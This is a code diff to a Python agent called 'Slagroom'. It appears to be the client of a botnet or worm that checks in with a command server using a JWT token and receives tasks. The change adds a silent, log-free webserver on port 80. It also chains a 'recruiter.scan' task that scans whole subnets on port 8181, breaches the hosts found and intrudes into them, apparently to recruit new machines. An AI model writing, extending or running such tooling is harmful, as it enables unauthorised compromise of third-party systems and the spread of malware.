@@ -16,11 +16,35 @@ import time
 import uuid
 import datetime
 import asyncio
+import http.server
+import socketserver
+from pathlib import Path
 
 from kers.apiClient import ApiClient
 from kers.scanner import Scanner
 from kers.breacher import Breacher
 from kers.intruder import Intruder
+from kers.ipParse import ip_parse
+
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, directory="www", **kwargs)
+
+    def list_directory(self, path):
+        # Return a 403 Forbidden response instead of listing directory contents
+        self.send_error(403, "Directory listing is not allowed")
+        return None
+
+    def log_message(self, format, *args):
+        # Override log_message to disable logging
+        return
+
+
+def _start_webserver() -> None:
+    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd:
+        print("[Slagroom] Webserver listening on port 80")
+        httpd.serve_forever()
 
 
 class Slagroom:
@@ -62,12 +86,15 @@ class Slagroom:
         self._verify_config()
 
         self._wait_time = 10
+        self._die = 1
         self._apiClient = ApiClient(self._config["API_URL"], self._config["JWT_TOKEN"])
         self._scanner = Scanner()
         self._breacher = Breacher()
         self._intruder = Intruder(self._apiClient)
         self._task_queue = queue.Queue()
         self._task = None
+        Path("www").mkdir(parents=True, exist_ok=True)
+        self._www_thread = threading.Thread(target=_start_webserver, daemon=True).start()
         self._thread = threading.Thread(target=self._worker, daemon=True)
 
     def _load_config(self) -> None:
@@ -89,7 +116,7 @@ class Slagroom:
             raise ValueError(f"Config does not hold all expected keys: {['API_URL', 'JWT_TOKEN']}")
 
     def _fill_queue(self) -> None:
-        tasks = self._apiClient.check_in()['commands']
+        tasks = self._apiClient.check_in()
         for task in tasks:
             self._task_queue.put(task)
 
@@ -106,18 +133,16 @@ class Slagroom:
                 print("[Slagroom] Tasks in queue...!")
                 task = self._task_queue.get()
                 print(f"[Slagroom] Current task : {task}")
-                match task["command"]:
-                    case 'scan':
-                        print(f"[Slagroom] Scanning {task['ips']}")
-                        output = self._scanner.scan_range(task["ips"], task["ports"])
-                    case 'breach':
-                        print(f"[Slagroom] Breaching {task['ips']}")
-                        output = self._breacher.breach(task["ips"], task["ports"])
-                        print(f"[Slagroom] Output: {output}")
-                    case 'intrude':
-                        print(f"[Slagroom] Intruding {task['ips']}")
-                        output = self._intruder.intrude(task['ips'])
-                        print(f"[Slagroom] Output: {output}")
+                if task['command'] == 'recruiter.scan':
+                    ips = ip_parse(task['subnets'])
+                    print(f"[Slagroom] Scanning {ips}")
+                    scan_output = self._scanner.scan_range(ips, ["8181"])
+                    print(f"[Slagroom] Breaching {scan_output}")
+                    breach_output = self._breacher.breach(scan_output)
+                    print(f"[Slagroom] Output: {breach_output}")
+                    print(f"[Slagroom] Intruding {breach_output}")
+                    intrude_output = self._intruder.intrude(breach_output)
+                    print(f"[Slagroom] Output: {intrude_output}")
                 self._task_queue.task_done()
                 time.sleep(self._wait_time)
             except KeyboardInterrupt:
